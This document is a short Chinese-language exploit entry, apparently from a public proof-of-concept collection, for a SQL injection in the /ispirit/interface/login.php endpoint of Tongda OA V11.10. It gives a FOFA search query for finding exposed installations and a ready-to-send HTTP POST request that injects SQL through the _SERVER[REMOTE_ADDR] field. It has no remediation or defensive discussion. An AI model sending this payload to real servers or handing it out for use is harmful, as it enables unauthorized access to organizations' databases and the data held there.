# 通达OAV11.10接口login.php存在SQL注入漏洞

通达OAV11.10接口 `/ispirit/interface/login.php ` 存在SQL注入漏洞。

## fofa

```yaml
app="TDXK-通达OA"
```

## poc

```java
POST /ispirit/interface/login.php HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.855.2 Safari/537.36 
Content-Type: application/x-www-form-urlencoded
Host:
Content-Length: 107

name=123&pass=123&_SERVER[REMOTE_ADDR]=1','10',(select+@`,'`+or+if(1% 3d0,1,(select+~0%2b1))+limit+0,1))--+'
```

